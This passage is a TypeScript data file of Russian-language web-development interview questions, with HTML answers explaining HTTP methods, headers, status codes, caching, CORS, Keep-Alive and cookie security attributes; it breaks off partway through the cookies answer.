export interface InterviewQuestion {
  id: number
  question: string
  answer: string
  difficulty?: 'junior' | 'middle' | 'senior'
  tags?: string[]
}

export const webInterviewQuestions: InterviewQuestion[] = [
  {
    id: 1,
    question: "Что такое протокол HTTP и как он используется в веб-разработке?",
    answer: "<p><strong>HTTP (HyperText Transfer Protocol)</strong> — это протокол прикладного уровня для передачи данных в интернете, который является основой обмена данными в World Wide Web.</p><p><strong>Как работает HTTP:</strong></p><ul><li>Клиент-серверная модель — браузер (клиент) отправляет запрос, сервер обрабатывает и возвращает ответ</li><li>Протокол без состояния (stateless) — каждый запрос независим, сервер не хранит информацию о предыдущих запросах</li><li>Текстовый протокол — легко читается и отлаживается</li></ul><p><strong>Основные компоненты HTTP:</strong></p><ul><li><strong>Запрос (Request)</strong> — содержит метод, URL, заголовки и опционально тело запроса</li><li><strong>Ответ (Response)</strong> — содержит статус код, заголовки и тело ответа</li></ul><p><strong>Применение в веб-разработке:</strong></p><ul><li>Загрузка веб-страниц и ресурсов</li><li>Отправка форм и данных на сервер</li><li>REST API взаимодействие</li><li>Загрузка и скачивание файлов</li></ul><p>HTTP работает поверх TCP/IP, обычно использует порт 80 (443 для HTTPS).</p>",
    difficulty: 'junior',
    tags: ['HTTP', 'протокол', 'основы', 'веб']
  },
  {
    id: 2,
    question: "Какие основные методы запросов (HTTP methods) существуют и для чего используются?",
    answer: "<p>HTTP определяет несколько методов для указания желаемого действия над ресурсом:</p><p><strong>GET:</strong></p><ul><li>Получение данных с сервера</li><li>Идемпотентный и безопасный метод</li><li>Параметры передаются в URL</li><li>Может кэшироваться браузером</li><li>Пример: получение списка товаров, загрузка страницы</li></ul><p><strong>POST:</strong></p><ul><li>Создание нового ресурса</li><li>Данные передаются в теле запроса</li><li>Не идемпотентный — повторный запрос создаст дубликат</li><li>Не кэшируется</li><li>Пример: отправка формы регистрации, создание заказа</li></ul><p><strong>PUT:</strong></p><ul><li>Обновление существующего ресурса целиком</li><li>Идемпотентный — повторный запрос не изменит результат</li><li>Заменяет весь ресурс</li><li>Пример: обновление профиля пользователя</li></ul><p><strong>PATCH:</strong></p><ul><li>Частичное обновление ресурса</li><li>Изменяет только указанные поля</li><li>Более эффективен чем PUT для небольших изменений</li><li>Пример: изменение только email пользователя</li></ul><p><strong>DELETE:</strong></p><ul><li>Удаление ресурса</li><li>Идемпотентный</li><li>Пример: удаление комментария, товара из корзины</li></ul><p><strong>HEAD:</strong></p><ul><li>Аналогичен GET, но возвращает только заголовки</li><li>Используется для проверки существования ресурса</li><li>Пример: проверка размера файла перед загрузкой</li></ul><p><strong>OPTIONS:</strong></p><ul><li>Запрос информации о доступных методах для ресурса</li><li>Используется в CORS preflight запросах</li></ul>",
    difficulty: 'junior',
    tags: ['HTTP methods', 'GET', 'POST', 'REST']
  },
  {
    id: 3,
    question: "Что такое заголовки HTTP (HTTP headers) и какую роль они играют?",
    answer: "<p><strong>HTTP заголовки</strong> — это пары ключ-значение, которые передают дополнительную информацию о запросе или ответе.</p><p><strong>Типы заголовков:</strong></p><p><strong>1. Заголовки запроса (Request Headers):</strong></p><ul><li><strong>User-Agent</strong> — информация о браузере и ОС клиента</li><li><strong>Accept</strong> — типы контента, которые клиент может обработать</li><li><strong>Authorization</strong> — учетные данные для аутентификации</li><li><strong>Cookie</strong> — сохраненные cookies для данного домена</li><li><strong>Content-Type</strong> — тип данных в теле запроса (для POST/PUT)</li></ul><p><strong>2. Заголовки ответа (Response Headers):</strong></p><ul><li><strong>Content-Type</strong> — тип возвращаемого контента</li><li><strong>Content-Length</strong> — размер тела ответа в байтах</li><li><strong>Set-Cookie</strong> — установка cookies на клиенте</li><li><strong>Cache-Control</strong> — директивы для кэширования</li><li><strong>Location</strong> — URL для перенаправления</li></ul><p><strong>3. Общие заголовки:</strong></p><ul><li><strong>Date</strong> — дата и время отправки сообщения</li><li><strong>Connection</strong> — управление соединением (keep-alive)</li></ul><p><strong>4. Заголовки сущности:</strong></p><ul><li><strong>Content-Encoding</strong> — метод сжатия (gzip, deflate)</li><li><strong>Last-Modified</strong> — дата последней модификации ресурса</li><li><strong>ETag</strong> — уникальный идентификатор версии ресурса</li></ul><p><strong>Роль заголовков:</strong></p><ul><li>Управление кэшированием и производительностью</li><li>Аутентификация и авторизация</li><li>Согласование контента (content negotiation)</li><li>Безопасность (CORS, CSP)</li><li>Мониторинг и отладка</li></ul>",
    difficulty: 'middle',
    tags: ['HTTP headers', 'заголовки', 'метаданные']
  },
  {
    id: 4,
    question: "Что такое статусы ответов HTTP (HTTP status codes) и какие наиболее распространенные?",
    answer: "<p><strong>HTTP статус коды</strong> — это трехзначные числа, которые сервер возвращает в ответ на запрос, указывая результат его обработки.</p><p><strong>Категории статусов:</strong></p><p><strong>1xx — Информационные:</strong></p><ul><li><strong>100 Continue</strong> — сервер готов принять тело запроса</li><li><strong>101 Switching Protocols</strong> — переключение протокола (например, на WebSocket)</li></ul><p><strong>2xx — Успешные:</strong></p><ul><li><strong>200 OK</strong> — запрос выполнен успешно</li><li><strong>201 Created</strong> — ресурс успешно создан (обычно после POST)</li><li><strong>204 No Content</strong> — успех, но нет контента для возврата</li></ul><p><strong>3xx — Перенаправления:</strong></p><ul><li><strong>301 Moved Permanently</strong> — постоянное перенаправление, обновить закладки</li><li><strong>302 Found</strong> — временное перенаправление</li><li><strong>304 Not Modified</strong> — ресурс не изменился, используйте кэш</li><li><strong>307 Temporary Redirect</strong> — временное перенаправление с сохранением метода</li><li><strong>308 Permanent Redirect</strong> — постоянное перенаправление с сохранением метода</li></ul><p><strong>4xx — Ошибки клиента:</strong></p><ul><li><strong>400 Bad Request</strong> — некорректный синтаксис запроса</li><li><strong>401 Unauthorized</strong> — требуется аутентификация</li><li><strong>403 Forbidden</strong> — доступ запрещен</li><li><strong>404 Not Found</strong> — ресурс не найден</li><li><strong>405 Method Not Allowed</strong> — метод не поддерживается для данного ресурса</li><li><strong>429 Too Many Requests</strong> — превышен лимит запросов (rate limiting)</li></ul><p><strong>5xx — Ошибки сервера:</strong></p><ul><li><strong>500 Internal Server Error</strong> — внутренняя ошибка сервера</li><li><strong>502 Bad Gateway</strong> — некорректный ответ от вышестоящего сервера</li><li><strong>503 Service Unavailable</strong> — сервис временно недоступен</li><li><strong>504 Gateway Timeout</strong> — таймаут при получении ответа от вышестоящего сервера</li></ul>",
    difficulty: 'junior',
    tags: ['HTTP status codes', 'статусы', 'коды ответов']
  },
  {
    id: 5,
    question: "Как работает механизм перенаправления (HTTP redirects) и какие типы существуют?",
    answer: "<p><strong>HTTP перенаправление</strong> — это механизм, при котором сервер указывает клиенту, что запрошенный ресурс находится по другому URL.</p><p><strong>Как работает:</strong></p><ol><li>Клиент отправляет запрос к URL-A</li><li>Сервер возвращает статус 3xx и заголовок Location с URL-B</li><li>Клиент автоматически отправляет новый запрос к URL-B</li><li>Сервер возвращает финальный ответ</li></ol><p><strong>Типы перенаправлений:</strong></p><p><strong>301 Moved Permanently:</strong></p><ul><li>Постоянное перенаправление</li><li>Поисковые системы обновляют индекс</li><li>Браузеры кэшируют перенаправление</li><li>Может изменить метод на GET</li><li>Используется для: переезда сайта, изменения URL структуры</li></ul><p><strong>302 Found (Temporary Redirect):</strong></p><ul><li>Временное перенаправление</li><li>Поисковики не обновляют индекс</li><li>Может изменить метод на GET</li><li>Используется для: временного технического обслуживания, A/B тестирования</li></ul><p><strong>307 Temporary Redirect:</strong></p><ul><li>Временное перенаправление</li><li>Гарантированно сохраняет метод и тело запроса</li><li>Более строгая версия 302</li></ul><p><strong>308 Permanent Redirect:</strong></p><ul><li>Постоянное перенаправление</li><li>Гарантированно сохраняет метод и тело запроса</li><li>Более строгая версия 301</li></ul><p><strong>303 See Other:</strong></p><ul><li>Перенаправление на другой URL методом GET</li><li>Используется после POST для избежания повторной отправки формы</li><li>Паттерн Post/Redirect/Get (PRG)</li></ul><p><strong>304 Not Modified:</strong></p><ul><li>Особый тип — не настоящее перенаправление</li><li>Указывает использовать кэшированную версию</li><li>Используется для условных запросов</li></ul><p><strong>Важные аспекты:</strong></p><ul><li>Максимум перенаправлений обычно ограничен (часто 20)</li><li>Выбор между 301 и 302 влияет на SEO</li><li>307/308 предпочтительнее 302/301 для современных приложений</li></ul>",
    difficulty: 'middle',
    tags: ['HTTP redirects', 'перенаправления', '301', '302']
  },
  {
    id: 6,
    question: "Что такое HTTPS и как оно отличается от HTTP?",
    answer: "<p><strong>HTTPS (HTTP Secure)</strong> — это расширение HTTP с шифрованием через SSL/TLS для безопасной передачи данных.</p><p><strong>Ключевые отличия от HTTP:</strong></p><p><strong>1. Шифрование:</strong></p><ul><li>HTTP — данные передаются открытым текстом</li><li>HTTPS — данные зашифрованы с помощью TLS/SSL</li><li>Защита от перехвата и чтения данных третьими лицами</li></ul><p><strong>2. Аутентификация:</strong></p><ul><li>HTTPS использует SSL-сертификаты</li><li>Сертификат подтверждает подлинность сервера</li><li>Предотвращает атаки типа man-in-the-middle</li></ul><p><strong>3. Целостность данных:</strong></p><ul><li>HTTPS гарантирует, что данные не были изменены при передаче</li><li>Использует хеширование для проверки целостности</li></ul><p><strong>Как работает HTTPS:</strong></p><ol><li><strong>TLS Handshake:</strong> установка защищенного соединения<ul><li>Клиент инициирует соединение</li><li>Сервер отправляет SSL-сертификат</li><li>Клиент проверяет сертификат</li><li>Согласование алгоритмов шифрования</li><li>Обмен ключами шифрования</li></ul></li><li><strong>Шифрование данных:</strong> вся дальнейшая передача данных происходит в зашифрованном виде</li><li><strong>Закрытие соединения:</strong> безопасное завершение сессии</li></ol><p><strong>Типы SSL-сертификатов:</strong></p><ul><li><strong>DV (Domain Validated)</strong> — базовая проверка домена</li><li><strong>OV (Organization Validated)</strong> — проверка организации</li><li><strong>EV (Extended Validation)</strong> — расширенная проверка, зеленая строка в браузере</li></ul><p><strong>Преимущества HTTPS:</strong></p><ul><li>Защита конфиденциальных данных (пароли, платежная информация)</li><li>Доверие пользователей — браузеры помечают HTTP сайты как небезопасные</li><li>SEO преимущества — Google предпочитает HTTPS сайты</li><li>Необходимо для современных API (Service Workers, HTTP/2)</li><li>Защита от фишинга</li></ul><p><strong>Недостатки:</strong></p><ul><li>Небольшое снижение производительности (TLS handshake)</li><li>Необходимость покупки и обновления сертификатов (хотя Let's Encrypt предоставляет бесплатные)</li><li>Более сложная настройка сервера</li></ul><p><strong>Современные требования:</strong></p><ul><li>Многие браузеры требуют HTTPS для доступа к определенным API</li><li>HTTP/2 и HTTP/3 работают только через HTTPS</li><li>PWA требуют HTTPS для установки</li></ul>",
    difficulty: 'junior',
    tags: ['HTTPS', 'SSL', 'TLS', 'безопасность', 'шифрование']
  },
  {
    id: 7,
    question: "Что такое идемпотентность в контексте HTTP методов?",
    answer: "<p><strong>Идемпотентность</strong> — это свойство операции, при котором повторное выполнение запроса с теми же параметрами дает тот же результат, что и однократное выполнение.</p><p><strong>Идемпотентные методы:</strong></p><p><strong>GET:</strong></p><ul><li>Множественные запросы возвращают одни и те же данные</li><li>Не изменяет состояние сервера</li><li>Безопасен для повторного выполнения</li></ul><p><strong>PUT:</strong></p><ul><li>Повторное обновление ресурса тем же контентом дает тот же результат</li><li>Первый запрос создает/обновляет ресурс</li><li>Последующие запросы ничего не меняют</li></ul><p><strong>DELETE:</strong></p><ul><li>Первый запрос удаляет ресурс</li><li>Последующие запросы возвращают 404, но это ожидаемое поведение</li><li>Конечный результат одинаков — ресурса нет</li></ul><p><strong>HEAD, OPTIONS:</strong></p><ul><li>Только получают метаинформацию</li><li>Не изменяют состояние</li></ul><p><strong>Не идемпотентные методы:</strong></p><p><strong>POST:</strong></p><ul><li>Каждый запрос создает новый ресурс</li><li>Повторный запрос = дубликат</li><li>Результат отличается от однократного выполнения</li></ul><p><strong>PATCH:</strong></p><ul><li>Может быть идемпотентным или нет, зависит от реализации</li><li>Если PATCH содержит абсолютные значения — идемпотентен</li><li>Если содержит относительные изменения (increment) — не идемпотентен</li></ul><p><strong>Практическое значение:</strong></p><ul><li>Идемпотентные запросы можно безопасно повторять при ошибках сети</li><li>Важно для автоматических retry механизмов</li><li>Упрощает обработку сбоев и восстановление</li></ul><p><strong>Пример не идемпотентности:</strong></p><ul><li>POST /api/orders — каждый вызов создает новый заказ</li><li>PATCH /api/counter (increment) — каждый вызов увеличивает счетчик</li></ul><p><strong>Пример идемпотентности:</strong></p><ul><li>PUT /api/users/123 — обновление того же пользователя теми же данными</li><li>DELETE /api/posts/456 — удаление поста (первый раз удаляет, второй раз возвращает 404)</li></ul>",
    difficulty: 'middle',
    tags: ['идемпотентность', 'HTTP methods', 'REST', 'архитектура']
  },
  {
    id: 8,
    question: "Что такое Content Negotiation и как он работает в HTTP?",
    answer: "<p><strong>Content Negotiation</strong> — это механизм, позволяющий серверу предоставлять разные представления одного и того же ресурса в зависимости от возможностей и предпочтений клиента.</p><p><strong>Типы согласования контента:</strong></p><p><strong>1. Server-driven negotiation (проактивное):</strong></p><ul><li>Сервер выбирает представление на основе заголовков запроса</li><li>Клиент указывает предпочтения через заголовки Accept*</li></ul><p><strong>2. Agent-driven negotiation (реактивное):</strong></p><ul><li>Сервер возвращает список доступных вариантов</li><li>Клиент выбирает подходящий вариант</li><li>Обычно через статус 300 Multiple Choices</li></ul><p><strong>Основные заголовки для согласования:</strong></p><p><strong>Accept:</strong></p><ul><li>Указывает желаемые MIME-типы контента</li><li>Пример: Accept: application/json, text/html;q=0.9</li><li>q-фактор (0-1) определяет приоритет</li></ul><p><strong>Accept-Language:</strong></p><ul><li>Предпочитаемые языки</li><li>Пример: Accept-Language: ru-RU, en-US;q=0.8</li></ul><p><strong>Accept-Encoding:</strong></p><ul><li>Поддерживаемые методы сжатия</li><li>Пример: Accept-Encoding: gzip, deflate, br</li></ul><p><strong>Accept-Charset:</strong></p><ul><li>Предпочитаемые кодировки символов</li><li>Устарел, обычно используется UTF-8</li></ul><p><strong>User-Agent:</strong></p><ul><li>Информация о браузере и платформе</li><li>Может влиять на выбор контента (мобильная/десктопная версия)</li></ul><p><strong>Как работает процесс:</strong></p><ol><li>Клиент отправляет запрос с заголовками Accept*</li><li>Сервер анализирует заголовки и q-факторы</li><li>Сервер выбирает наилучшее представление</li><li>Сервер возвращает выбранный контент с заголовком Content-Type</li><li>Если подходящего представления нет — 406 Not Acceptable</li></ol><p><strong>Практические примеры:</strong></p><p><strong>Формат данных:</strong></p><ul><li>API может возвращать JSON или XML в зависимости от Accept</li><li>Одна и та же страница может быть HTML или Markdown</li></ul><p><strong>Язык:</strong></p><ul><li>Сайт отображается на русском или английском</li><li>Основано на Accept-Language</li></ul><p><strong>Сжатие:</strong></p><ul><li>Сервер выбирает gzip, brotli или отправляет без сжатия</li><li>Основано на Accept-Encoding и Content-Encoding</li></ul><p><strong>Адаптивный дизайн:</strong></p><ul><li>Мобильная или десктопная версия сайта</li><li>Основано на User-Agent или специальных заголовках</li></ul><p><strong>Заголовок Vary:</strong></p><ul><li>Сервер указывает, какие заголовки влияли на выбор контента</li><li>Важно для кэширования прокси-серверами</li><li>Пример: Vary: Accept-Language, Accept-Encoding</li></ul>",
    difficulty: 'middle',
    tags: ['Content Negotiation', 'Accept', 'заголовки', 'REST']
  },
  {
    id: 9,
    question: "Что такое HTTP/2 и какие преимущества он дает по сравнению с HTTP/1.1?",
    answer: "<p><strong>HTTP/2</strong> — это обновленная версия протокола HTTP, разработанная для улучшения производительности веб-приложений.</p><p><strong>Ключевые улучшения HTTP/2:</strong></p><p><strong>1. Бинарный протокол:</strong></p><ul><li>HTTP/1.1 — текстовый протокол</li><li>HTTP/2 — бинарный, более эффективен для парсинга</li><li>Меньше ошибок при обработке</li><li>Более компактное представление данных</li></ul><p><strong>2. Мультиплексирование:</strong></p><ul><li>Множество запросов/ответов одновременно в одном TCP соединении</li><li>Решает проблему head-of-line blocking</li><li>Не нужно открывать множество параллельных соединений</li><li>Более эффективное использование сетевых ресурсов</li></ul><p><strong>3. Server Push:</strong></p><ul><li>Сервер может отправлять ресурсы до запроса клиента</li><li>Например, при запросе HTML сервер сразу отправляет CSS и JS</li><li>Уменьшает количество round-trips</li><li>Снижает время загрузки страницы</li></ul><p><strong>4. Сжатие заголовков (HPACK):</strong></p><ul><li>HTTP/1.1 не сжимает заголовки</li><li>HPACK алгоритм сжимает повторяющиеся заголовки</li><li>Особенно эффективно для множества запросов</li><li>Снижает overhead на передачу метаданных</li></ul><p><strong>5. Приоритизация потоков:</strong></p><ul><li>Клиент может указать приоритет запросов</li><li>Критичные ресурсы загружаются первыми</li><li>Оптимизация порядка загрузки</li></ul><p><strong>6. Одно соединение:</strong></p><ul><li>Требуется только одно TCP соединение на домен</li><li>Уменьшает нагрузку на сервер и клиент</li><li>Снижает латентность установки соединения</li></ul><p><strong>Сравнение с HTTP/1.1:</strong></p><p><strong>HTTP/1.1 проблемы:</strong></p><ul><li>Head-of-line blocking — следующий запрос ждет завершения предыдущего</li><li>Дублирование заголовков в каждом запросе</li><li>Необходимость domain sharding для параллельных загрузок</li><li>Конкатенация файлов для уменьшения запросов</li></ul><p><strong>HTTP/2 решения:</strong></p><ul><li>Параллельные запросы без блокировки</li><li>Сжатые заголовки</li><li>Не нужен domain sharding</li><li>Можно не конкатенировать файлы</li></ul><p><strong>Требования HTTP/2:</strong></p><ul><li>Обязательно HTTPS (хотя спецификация допускает HTTP)</li><li>Поддержка сервера и клиента</li><li>TLS 1.2 или выше</li></ul><p><strong>Практический результат:</strong></p><ul><li>Уменьшение времени загрузки страницы на 20-50%</li><li>Лучшая производительность на мобильных сетях</li><li>Меньше накладных расходов</li><li>Улучшенный пользовательский опыт</li></ul><p><strong>Ограничения:</strong></p><ul><li>Все еще может быть TCP head-of-line blocking на уровне транспорта</li><li>Сложнее отладка из-за бинарного формата</li><li>Server Push не всегда эффективен</li></ul>",
    difficulty: 'senior',
    tags: ['HTTP/2', 'производительность', 'мультиплексирование', 'оптимизация']
  },
  {
    id: 10,
    question: "Что такое кэширование в HTTP и какие механизмы для этого существуют?",
    answer: "<p><strong>HTTP кэширование</strong> — это механизм хранения копий ресурсов для уменьшения нагрузки на сервер и ускорения загрузки страниц.</p><p><strong>Основные заголовки кэширования:</strong></p><p><strong>Cache-Control (основной заголовок):</strong></p><ul><li><strong>no-cache</strong> — проверять с сервером перед использованием кэша</li><li><strong>no-store</strong> — не кэшировать вообще (конфиденциальные данные)</li><li><strong>public</strong> — может кэшироваться любыми прокси</li><li><strong>private</strong> — только в браузере пользователя</li><li><strong>max-age=3600</strong> — время жизни кэша в секундах</li><li><strong>must-revalidate</strong> — проверять после истечения</li><li><strong>immutable</strong> — контент никогда не изменится</li></ul><p><strong>Expires:</strong></p><ul><li>Устаревший способ, указывает дату истечения</li><li>Пример: Expires: Wed, 21 Oct 2025 07:28:00 GMT</li><li>Cache-Control имеет приоритет</li></ul><p><strong>Условные запросы (Validation):</strong></p><p><strong>ETag:</strong></p><ul><li>Уникальный идентификатор версии ресурса</li><li>Сервер: ETag: \"abc123\"</li><li>Клиент при следующем запросе: If-None-Match: \"abc123\"</li><li>Если не изменился: 304 Not Modified</li></ul><p><strong>Last-Modified:</strong></p><ul><li>Дата последней модификации ресурса</li><li>Сервер: Last-Modified: Wed, 15 Nov 2023 12:00:00 GMT</li><li>Клиент: If-Modified-Since: Wed, 15 Nov 2023 12:00:00 GMT</li><li>Если не изменился: 304 Not Modified</li></ul><p><strong>Уровни кэширования:</strong></p><ol><li><strong>Браузерный кэш:</strong><ul><li>Локальное хранилище в браузере</li><li>Memory cache (в RAM)</li><li>Disk cache (на диске)</li></ul></li><li><strong>Прокси-кэш:</strong><ul><li>Промежуточные серверы</li><li>CDN кэширование</li><li>Корпоративные прокси</li></ul></li><li><strong>Gateway cache:</strong><ul><li>Обратные прокси перед сервером</li><li>Varnish, Nginx кэш</li></ul></li></ol><p><strong>Стратегии кэширования:</strong></p><p><strong>1. Immutable assets (статические файлы):</strong></p><ul><li>CSS, JS, изображения с хешем в имени</li><li>Cache-Control: public, max-age=31536000, immutable</li><li>Можно кэшировать навсегда, так как имя файла изменится</li></ul><p><strong>2. HTML страницы:</strong></p><ul><li>Cache-Control: no-cache или max-age=0</li><li>Всегда проверять актуальность с сервером</li></ul><p><strong>3. API ответы:</strong></p><ul><li>Зависит от данных</li><li>Часто no-cache или короткий max-age</li><li>Использовать ETag для оптимизации</li></ul><p><strong>4. Конфиденциальные данные:</strong></p><ul><li>Cache-Control: private, no-store</li><li>Не хранить в кэше вообще</li></ul><p><strong>Vary заголовок:</strong></p><ul><li>Указывает, от каких заголовков зависит кэш</li><li>Vary: Accept-Encoding, Accept-Language</li><li>Важно для корректного кэширования прокси</li></ul><p><strong>Проблемы кэширования:</strong></p><ul><li>Устаревшие данные (stale content)</li><li>Необходимость инвалидации кэша</li><li>Сложность конфигурации</li></ul><p><strong>Best practices:</strong></p><ul><li>Использовать fingerprinting/hashing для статики</li><li>Правильно настраивать Cache-Control</li><li>Использовать ETag для динамического контента</li><li>Тестировать на разных уровнях кэширования</li></ul>",
    difficulty: 'middle',
    tags: ['кэширование', 'Cache-Control', 'ETag', 'производительность']
  },
  {
    id: 11,
    question: "Что такое CORS и как он работает в контексте HTTP?",
    answer: "<p><strong>CORS (Cross-Origin Resource Sharing)</strong> — это механизм безопасности, позволяющий веб-страницам делать запросы к другим доменам с соблюдением политики безопасности.</p><p><strong>Same-Origin Policy (проблема):</strong></p><ul><li>Браузеры блокируют межсайтовые запросы по умолчанию</li><li>Защита от кражи данных злонамеренными сайтами</li><li>Origin = протокол + домен + порт</li><li>http://example.com:80 ≠ https://example.com:443</li></ul><p><strong>Как CORS решает проблему:</strong></p><ol><li>Браузер отправляет запрос с заголовком Origin</li><li>Сервер проверяет Origin и добавляет CORS заголовки</li><li>Браузер проверяет заголовки и разрешает/блокирует доступ к ответу</li></ol><p><strong>Типы CORS запросов:</strong></p><p><strong>1. Простые запросы (Simple requests):</strong></p><ul><li>Методы: GET, HEAD, POST</li><li>Только простые заголовки (Content-Type: text/plain, application/x-www-form-urlencoded, multipart/form-data)</li><li>Отправляются сразу без preflight</li></ul><p><strong>2. Preflight запросы:</strong></p><ul><li>Для сложных запросов (PUT, DELETE, custom headers)</li><li>Браузер сначала отправляет OPTIONS запрос</li><li>Сервер отвечает разрешенными методами и заголовками</li><li>Затем отправляется основной запрос</li></ul><p><strong>Основные CORS заголовки:</strong></p><p><strong>Со стороны клиента:</strong></p><ul><li><strong>Origin</strong> — источник запроса (автоматически добавляется браузером)</li></ul><p><strong>Со стороны сервера:</strong></p><ul><li><strong>Access-Control-Allow-Origin</strong> — разрешенные origins (* или конкретный origin)</li><li><strong>Access-Control-Allow-Methods</strong> — разрешенные HTTP методы</li><li><strong>Access-Control-Allow-Headers</strong> — разрешенные заголовки</li><li><strong>Access-Control-Allow-Credentials</strong> — разрешить cookies и authorization (true/false)</li><li><strong>Access-Control-Max-Age</strong> — время кэширования preflight ответа</li><li><strong>Access-Control-Expose-Headers</strong> — какие заголовки ответа доступны клиенту</li></ul><p><strong>Процесс Preflight:</strong></p><ol><li>Браузер отправляет OPTIONS запрос:<ul><li>Origin: https://example.com</li><li>Access-Control-Request-Method: DELETE</li><li>Access-Control-Request-Headers: Content-Type</li></ul></li><li>Сервер отвечает:<ul><li>Access-Control-Allow-Origin: https://example.com</li><li>Access-Control-Allow-Methods: GET, POST, DELETE</li><li>Access-Control-Allow-Headers: Content-Type</li><li>Access-Control-Max-Age: 86400</li></ul></li><li>Если разрешено — браузер отправляет основной запрос</li></ol><p><strong>Credentials (cookies):</strong></p><ul><li>По умолчанию cookies не отправляются в cross-origin запросах</li><li>Нужно установить credentials: 'include' в fetch</li><li>Сервер должен вернуть Access-Control-Allow-Credentials: true</li><li>И конкретный origin, не * (для безопасности)</li></ul><p><strong>Типичные ошибки CORS:</strong></p><ul><li>Забыли добавить CORS заголовки на сервере</li><li>Неправильная настройка Access-Control-Allow-Origin</li><li>Использование * с credentials</li><li>Не обрабатывается OPTIONS preflight запрос</li></ul><p><strong>Решение проблем CORS:</strong></p><ul><li>Правильная настройка сервера</li><li>Использование прокси для разработки</li><li>JSONP (устаревший способ)</li><li>Server-side запросы (без ограничений CORS)</li></ul>",
    difficulty: 'middle',
    tags: ['CORS', 'безопасность', 'cross-origin', 'Same-Origin Policy']
  },
  {
    id: 12,
    question: "Что такое Keep-Alive соединение и как оно улучшает производительность?",
    answer: "<p><strong>Keep-Alive (persistent connection)</strong> — это механизм, позволяющий повторно использовать одно TCP соединение для множества HTTP запросов/ответов.</p><p><strong>Как работало в HTTP/1.0:</strong></p><ul><li>Каждый запрос требовал нового TCP соединения</li><li>Соединение закрывалось после ответа</li><li>Высокие накладные расходы на установку/закрытие соединений</li></ul><p><strong>Keep-Alive в HTTP/1.1:</strong></p><ul><li>Соединение остается открытым по умолчанию</li><li>Множество запросов через одно соединение</li><li>Заголовок Connection: keep-alive (или по умолчанию)</li><li>Connection: close для явного закрытия</li></ul><p><strong>Преимущества Keep-Alive:</strong></p><p><strong>1. Снижение латентности:</strong></p><ul><li>Нет накладных расходов на TCP handshake для каждого запроса</li><li>TCP handshake занимает 1 RTT (Round Trip Time)</li><li>Экономия особенно заметна на высоколатентных соединениях</li></ul><p><strong>2. Снижение нагрузки:</strong></p><ul><li>Меньше нагрузки на сервер</li><li>Меньше создания/уничтожения сокетов</li><li>Экономия CPU и памяти</li></ul><p><strong>3. TLS эффективность:</strong></p><ul><li>Для HTTPS не нужно повторять TLS handshake</li><li>TLS handshake очень дорогая операция</li><li>Значительная экономия времени</li></ul><p><strong>4. TCP оптимизации:</strong></p><ul><li>TCP slow start работает эффективнее</li><li>Соединение \"разогревается\" и достигает полной пропускной способности</li><li>Congestion window растет с каждым пакетом</li></ul><p><strong>Параметры Keep-Alive:</strong></p><p><strong>Keep-Alive заголовок:</strong></p><ul><li>timeout — время простоя до закрытия (секунды)</li><li>max — максимальное количество запросов</li><li>Пример: Keep-Alive: timeout=5, max=100</li></ul><p><strong>Конфигурация сервера:</strong></p><ul><li>Nginx: keepalive_timeout 65;</li><li>Apache: KeepAlive On, KeepAliveTimeout 5</li></ul><p><strong>Проблемы Keep-Alive:</strong></p><p><strong>1. Head-of-line blocking (HTTP/1.1):</strong></p><ul><li>Запросы обрабатываются последовательно</li><li>Медленный запрос блокирует остальные</li><li>Решено в HTTP/2 через мультиплексирование</li></ul><p><strong>2. Ресурсы сервера:</strong></p><ul><li>Открытые соединения потребляют память</li><li>Нужен баланс между timeout и ресурсами</li><li>При большом количестве клиентов может быть проблемой</li></ul><p><strong>3. Idle соединения:</strong></p><ul><li>Простаивающие соединения занимают ресурсы</li><li>Firewall может разрывать долгие соединения</li><li>Нужны правильные timeout настройки</li></ul><p><strong>HTTP/2 и Keep-Alive:</strong></p><ul><li>В HTTP/2 концепция Keep-Alive встроена</li><li>Одно долгоживущее соединение на домен</li><li>Мультиплексирование решает проблему blocking</li><li>Еще более эффективное использование соединений</li></ul><p><strong>Best practices:</strong></p><ul><li>Всегда включать Keep-Alive (по умолчанию в HTTP/1.1)</li><li>Настраивать разумные timeout (5-15 секунд)</li><li>Ограничивать max запросов (100-1000)</li><li>Мониторить количество открытых соединений</li><li>Использовать HTTP/2 где возможно</li></ul><p><strong>Когда отключать Keep-Alive:</strong></p><ul><li>Один запрос к серверу (очень редкий случай)</li><li>Ограниченные ресурсы сервера</li><li>Специфические security требования</li></ul>",
    difficulty: 'senior',
    tags: ['Keep-Alive', 'persistent connection', 'производительность', 'TCP']
  },
  {
    id: 13,
    question: "Что такое HTTP cookies и как они работают? Какие атрибуты безопасности существуют?",
    answer: "<p><strong>HTTP Cookies</strong> — это небольшие фрагменты данных, которые сервер отправляет браузеру, а браузер сохраняет и отправляет обратно с последующими запросами.</p><p><strong>Как работают cookies:</strong></p><ol><li>Сервер устанавливает cookie через заголовок Set-Cookie</li><li>Браузер сохраняет cookie локально</li><li>Браузер автоматически отправляет cookie с каждым запросом через заголовок Cookie</li><li>Cookie существует до истечения срока или удаления</li></ol><p><strong>Установка cookie (Set-Cookie):</strong></p><ul><li>Set-Cookie: sessionId=abc123; Domain=example.com; Path=/; Max-Age=3600</li></ul><p><strong>Основные атрибуты cookie:</strong></p><p><strong>1. Expires / Max-Age:</strong></p><ul><li><strong>Expires</strong> — дата истечения (Expires=Wed, 09 Jun 2025 10:18:14 GMT)</li><li><strong>Max-Age</strong> — время жизни в секундах (Max-Age=3600 для 1 часа)</li><li>Без этих атрибутов — session cookie (удаляется при закрытии браузера)</li></ul><p><strong>2. Domain:</strong></p><ul><li>Для каких доменов доступна cookie</li><li>Domain=example.com — доступна для example.com и поддоменов</li><li>По умолчанию — только текущий домен, без поддоменов</li></ul><p><strong>3. Path:</strong></p><ul><li>Для каких путей доступна cookie</li><li>Path=/admin — только для URL начинающихся с /admin</li><li>Path=/ — для всего сайта</li></ul><p><strong>Атрибуты безопасности:</strong></p><p><strong>1. Secure:</strong></p><ul><li>Cookie отправляется только через HTTPS</li><li>Защита от перехвата в незашифрованном соединении</li><li>Обязательно для конфиденциальных данных</li><li>Set-Cookie: token=abc; Secure</li></ul><p><strong>2. HttpOnly:</strong></p><ul><li>Cookie недоступна для JavaScript (document.cookie)</li><li>Защита от XSS атак</li><li>JavaScript не может прочитать или изменить cookie</li><li>Set-Cookie: sessionId=abc; HttpOnly</li></ul><p><strong>3. SameSite:</strong></p><ul><li>Контролирует отправку cookie в cross-site запросах</li><li><strong>SameSite=Strict</strong> — cookie только для same-site запросов (самая строгая защита от CSRF)</li><li><strong>SameSite=Lax</strong> — cookie для top-level navigation (GET), защита от большинства CSRF (по умолчанию в современных браузерах)</li><li><strong>SameSite=None</strong> — cookie отправляется всегда (требует 